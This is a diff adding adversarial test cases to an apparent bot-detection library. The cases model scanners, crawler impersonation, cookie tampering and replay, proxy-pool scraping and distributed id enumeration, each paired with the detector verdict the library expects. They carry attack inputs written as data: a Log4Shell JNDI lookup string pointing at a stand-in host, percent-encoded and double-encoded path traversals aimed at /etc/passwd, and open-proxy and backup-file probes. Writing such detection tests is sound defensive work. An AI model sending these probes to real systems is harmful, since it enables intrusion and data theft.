@@ -22,8 +22,41 @@ import type { TrafficCase } from "./schema.js";
  */
 
 const CHROME_UA = userAgentOf("chromeWindows");
+const CURL_UA = "curl/8.4.0";
 
 export const ADVERSARIAL_CASES: TrafficCase[] = [
+  bot({
+    id: "two-scanners-one-address",
+    title: "One address arriving as two different security tools",
+    audience: "hostile",
+    category: "scanning",
+    provenance:
+      "The shape of an actual scan: an operator runs more than one tool against a target, and both announce themselves honestly. Each request on its own is a declared bot; the pair is a scan, and that reading does not exist inside either request.",
+    requests: [
+      { headers: [["Host", "shop.example"], ["User-Agent", "sqlmap/1.7.2#stable (http://sqlmap.org)"], ["Accept", "*/*"]], ip: "198.51.100.66", atMs: 0 },
+      { headers: [["Host", "shop.example"], ["User-Agent", "Mozilla/5.00 (Nikto/2.5.0) (Evasions:None) (Test:Port Check)"], ["Accept", "*/*"]], ip: "198.51.100.66", atMs: 1_000 },
+    ],
+    expect: { verdict: "confirmed-bot", certain: true, detectors: ["blended-identity"] },
+    notes:
+      "Holds under the default address-based actor key, which is what separates it from `identity-rotation`. A NAT gateway presents a hundred browsers — that is exactly why counting User-Agents there is useless — and it does not present sqlmap and nikto.",
+  }),
+
+  bot({
+    id: "two-crawler-claims-one-address",
+    title: "One address claiming to be both Googlebot and Bingbot",
+    audience: "hostile",
+    category: "impersonation",
+    provenance:
+      "At most one of these can be true of an address: each operator publishes a proof tied to addresses it controls. The contradiction is visible from the claims alone, with no lookup — which matters when DNS is unreachable and neither claim can be refuted on its own.",
+    requests: [
+      { headers: [["Host", "shop.example"], ["User-Agent", "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"], ["Accept", "*/*"]], ip: "198.51.100.67", atMs: 0 },
+      { headers: [["Host", "shop.example"], ["User-Agent", "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"], ["Accept", "*/*"]], ip: "198.51.100.67", atMs: 1_000 },
+    ],
+    expect: { detectors: ["blended-identity"] },
+    notes:
+      "Held at `strong` rather than `certain`. Trusting the wrong forwarded header collapses every client onto one address, and then two genuinely different crawlers produce this exact set — so it may contribute to a denial and may not be the whole of one.",
+  }),
+
   bot({
     id: "id-harvest-contiguous",
     title: "Every profile id in order, with a copied browser header set",
@@ -80,6 +113,162 @@ export const ADVERSARIAL_CASES: TrafficCase[] = [
     },
     notes:
       "Capped at `moderate` because it is not always the client's doing: a few older load balancers speak HTTP/1.0 to the origin, and behind one of those every request looks like this. That is what `transportCoherenceDetector({ legacyHttp: false })` is for, and why this may never deny anybody on its own.",
+  }),
+
+  // ---------------------------------------------------------------------------
+  // The optional sources. None of these can be detected without the operator
+  // switching something on — a marker cookie, or a site-wide baseline — so each
+  // exists to hold that feature to the same standard as everything shipped by
+  // default. See `docs/detection/correlation.md`.
+  // ---------------------------------------------------------------------------
+
+  bot({
+    id: "marker-held-while-identity-changes",
+    title: "One client presenting a marker it was issued as Chrome, then as curl",
+    audience: "unwanted-bot",
+    category: "evasion",
+    provenance:
+      "Identity rotation, which is invisible without a marker. Correlating by address cannot tell this apart from two people sharing an office connection, so the library declined to guess. A signed cookie removes the ambiguity: both requests carried an HMAC only this server can produce.",
+    requires: ["marker-probe"],
+    requests: [
+      ...repeat({ ...browser("chromeWindows"), ip: "198.51.100.81", headers: [...browser("chromeWindows").headers, ["Cookie", "sid=held"]] }, 4, 1500, (i) => `/products/${i}`),
+      ...repeat({ ...plain(CURL_UA), ip: "198.51.100.81", headers: [...plain(CURL_UA).headers, ["Cookie", "sid=held"]] }, 4, 1500, (i) => `/products/${i + 4}`).map((request) => ({ ...request, atMs: (request.atMs ?? 0) + 6000 })),
+    ],
+    expect: { verdict: "confirmed-bot", detectors: ["identity-drift"] },
+    notes:
+      "The browser family carries the weight and the platform does not, because a phone with `Request desktop site` changes its platform and is a person. Software does not change what it is.",
+  }),
+
+  bot({
+    id: "marker-never-stored-though-cookies-sent",
+    title: "A client replaying a captured session cookie and storing nothing new",
+    audience: "unwanted-bot",
+    category: "scraping",
+    provenance:
+      "A scraper handed a session header to copy. It sends the one cookie it was configured with on every request and never stores anything the server sets, which a browser with a jar does not do.",
+    requires: ["marker-probe"],
+    keepsCookies: false,
+    requests: repeat(
+      { ...browser("chromeWindows"), ip: "198.51.100.82", headers: [...browser("chromeWindows").headers, ["Cookie", "sid=captured-elsewhere"]] },
+      9,
+      1200,
+      (i) => `/products/${i}`,
+    ),
+    expect: { verdict: "unknown", detectors: ["marker-persistence"] },
+    notes:
+      "Deliberately narrower than `session-integrity`, which already reports a client sending no cookie at all. Overlapping them double-counted one observation and the population it landed on was people who block cookies.",
+  }),
+
+  bot({
+    id: "marker-edited-by-its-holder",
+    title: "A client that edited the signed cookie it was given",
+    audience: "unwanted-bot",
+    category: "evasion",
+    provenance:
+      "Browsers do not edit their own cookies. A marker failing its HMAC was altered by whoever held it, and the only reason to alter an opaque signed value is to see what the server does with a different one.",
+    requires: ["marker-probe"],
+    keepsCookies: false,
+    requests: repeat(
+      { ...browser("chromeWindows"), ip: "198.51.100.83", headers: [...browser("chromeWindows").headers, ["Cookie", "__bh_m=eyJ2IjoxfQ.not-a-signature-this-server-made"]] },
+      4,
+      1500,
+      (i) => `/account/${i}`,
+    ),
+    expect: { verdict: "unknown", detectors: ["marker-integrity"] },
+    notes:
+      "Stops at `strong` rather than `certain` because a middlebox or a broken cookie jar can mangle a value in transit. That is rare, it is not the client's fault, and it should cost a challenge rather than a door.",
+  }),
+
+  bot({
+    id: "marker-carried-across-a-proxy-pool",
+    title: "One marker presented from twenty different networks",
+    audience: "unwanted-bot",
+    category: "scraping",
+    provenance:
+      "A scraper on a rotating proxy pool that keeps its cookie jar, which most of them do because discarding it breaks the sites they are taking. The marker comes back only from the client that received it, so this is one client across twenty networks.",
+    requires: ["marker-probe"],
+    requests: Array.from({ length: 20 }, (_, index) => ({
+      ...browser("chromeWindows"),
+      headers: [...browser("chromeWindows").headers, ["Cookie", "sid=pooled"] as [string, string]],
+      ip: `198.51.${140 + index}.9`,
+      path: `/catalogue/${index}`,
+      atMs: index * 2500,
+    })),
+    expect: { verdict: "unknown", detectors: ["marker-fanout"] },
+    notes:
+      "Capped at `moderate` and offered no higher: a phone on a carrier using CGNAT can be renumbered across a great many /24s in the twelve hours a marker lives, and so can anyone whose employer egresses through a rotating pool.",
+  }),
+
+  bot({
+    id: "range-walked-across-many-clients",
+    title: "An id range divided between ten clients so none of them walks enough to notice",
+    audience: "unwanted-bot",
+    category: "scraping",
+    provenance:
+      "The threat every per-actor threshold misses by construction. Split a range across enough addresses and each one is unremarkable, `id-enumeration` fires for nobody, and the range is still walked end to end. It is only visible in the union.",
+    requires: ["site-baseline"],
+    requests: Array.from({ length: 200 }, (_, index) => ({
+      ...browser("chromeWindows"),
+      ip: `198.51.${170 + (index % 10)}.5`,
+      path: `/user/${index + 1}`,
+      atMs: index * 900,
+    })),
+    expect: { verdict: "unknown", detectors: ["distributed-walk"] },
+    notes:
+      "Coverage and the revisit ratio must both agree. Many clients on numbered pages is what a catalogue is; what a catalogue also has, and an enumeration does not, is people returning to the same popular items.",
+  }),
+
+  bot({
+    id: "fresh-path-wanted-by-everybody",
+    title: "A path this site never served, requested at once by twenty unrelated clients",
+    audience: "unwanted-bot",
+    category: "recon",
+    provenance:
+      "What a freshly disclosed vulnerability looks like from inside a site: a URL nobody had ever requested is requested by hundreds of unrelated clients within the hour, each making a single request and moving on.",
+    requires: ["site-baseline"],
+    requests: Array.from({ length: 20 }, (_, index) => ({
+      ...plain(CURL_UA),
+      ip: `198.51.${190 + index}.11`,
+      path: "/vendor/proprietary-thing/rce.php",
+      status: 404,
+      atMs: index * 3000,
+    })),
+    expect: { verdict: "unknown", detectors: ["path-campaign"] },
+    notes:
+      "The miss rate is required rather than optional. Many clients arriving at once on a brand-new URL is also exactly what a successful launch looks like; what separates them is whether the site had anything to serve.",
+  }),
+
+  bot({
+    id: "missing-far-more-than-this-site-does",
+    title: "A client answered \"not found\" far more often than the site answers it at all",
+    audience: "unwanted-bot",
+    category: "recon",
+    provenance:
+      "A fixed miss threshold is wrong on both kinds of site: on one mid-migration it reports everybody, and on a tidy one it stays silent while a client misses a third of the time. The site's own rate is the only honest comparison.",
+    requires: ["site-baseline"],
+    requests: repeat({ ...plain(CURL_UA), ip: "198.51.210.12", status: 404 }, 26, 1100, (i) => `/backup-${i}.sql`),
+    expect: { verdict: "unknown", detectors: ["miss-baseline"] },
+    notes:
+      "Shares the `misses` family with `probe-volume`, which reads the same misses against a fixed threshold. One cause, so the stronger reading stands rather than the two summing.",
+  }),
+
+  bot({
+    id: "solution-farm-replaying-answers",
+    title: "A client answering challenges with solutions that have already been spent",
+    audience: "unwanted-bot",
+    category: "evasion",
+    provenance:
+      "What a solved-challenge farm looks like from the server. A challenge nonce is random, single-use and signed, so a second valid solution for one is the same answer sent twice or one answer handed around — neither of which a browser does. One replay is a retried POST on a flaky connection, which is why the threshold is not one.",
+    challengeHistory: { replayedSolutions: 4, implausibleSolves: 2 },
+    requests: repeat({ ...browser("chromeWindows"), ip: "198.51.100.71" }, 6, 1500, () => "/account"),
+    expect: {
+      // A shape worth reporting and not worth concluding from: the client is otherwise
+      // indistinguishable from the browser whose headers it copied.
+      verdict: "unknown",
+      detectors: ["challenge-integrity"],
+    },
+    notes:
+      "The proof-of-work floor is measured on the server between issuing and receiving, so no client clock is involved, and it is set at a SHA-256 rate no browser has ever reached. Both signals stay `moderate`: they say the answers did not come from the page we served, which is a fact about the answering software rather than proof about the traffic it is attached to.",
   }),
 
   bot({
@@ -476,6 +665,43 @@ export const ADVERSARIAL_CASES: TrafficCase[] = [
     provenance: "CVE-2021-44228 scanning has never stopped; the payload is sprayed into every parameter and header a crawler can reach",
     requests: [{ ...browser("chromeWindows"), path: "/search?q=%24%7Bjndi%3Aldap%3A%2F%2Fscanner.example%2Fa%7D" }],
     expect: { certain: false, detectors: ["probe-signature"], neverAction: ["block", "drop"] },
+    tags: ["scanning"],
+  }),
+  bot({
+    id: "traversal-encoded-past-a-filter",
+    title: "A traversal with its dots and slashes written in percent-encoding",
+    audience: "hostile",
+    category: "wordlist-probe",
+    provenance:
+      "The standard first move against a path filter, and the reason this library keeps the raw target: normalisation resolves the dots, so what reaches a wordlist check is `/app/config.yml` — an ordinary-looking path nobody has, on no list. The spelling is the whole signal, and it is destroyed by the thing that makes rules work.",
+    requests: [{ ...browser("chromeWindows"), path: "/%2e%2e%2f%2e%2e%2fapp/config.yml", status: 404 }],
+    expect: { certain: false, detectors: ["target-integrity"], neverAction: ["block", "drop"] },
+    notes:
+      "`strong`, not proven. A path segment carrying a URL as data is encoded to sit in a path and encoded again by whatever built the link, which produces the same characters honestly — so this may score, and may not close a door on its own.",
+    tags: ["scanning"],
+  }),
+  bot({
+    id: "traversal-double-encoded",
+    title: "A traversal encoded twice, so one round of decoding leaves it encoded",
+    audience: "hostile",
+    category: "wordlist-probe",
+    provenance:
+      "Aimed at a filter that decodes once and then inspects: after its single pass the target still reads `%2e%2e%2f`, which the filter does not recognise, and the server behind it decodes again.",
+    requests: [{ ...browser("chromeWindows"), path: "/static/%252e%252e%252f%252e%252e%252fetc/passwd", status: 404 }],
+    expect: { certain: false, detectors: ["target-integrity"], neverAction: ["block", "drop"] },
+    tags: ["scanning"],
+  }),
+  bot({
+    id: "absolute-form-proxy-probe",
+    title: "A request target addressed to somewhere else entirely",
+    audience: "hostile",
+    category: "protocol-abuse",
+    provenance:
+      "Absolute-form is the request line a client sends to a *proxy*. Arriving at an origin server it is a question — will you fetch this for me — and open-proxy scanning asks it of everything with a port 80 open.",
+    requests: [{ ...plain(CHROME_UA), path: "http://scanner.example/check", status: 404 }],
+    expect: { certain: false, detectors: ["target-integrity"], neverAction: ["block", "drop"] },
+    notes:
+      "RFC 9112 §3.2.2 requires servers to accept absolute-form, so this is not malformed and is not proven. No browser has ever sent one to an origin server.",
     tags: ["scanning"],
   }),
   bot({
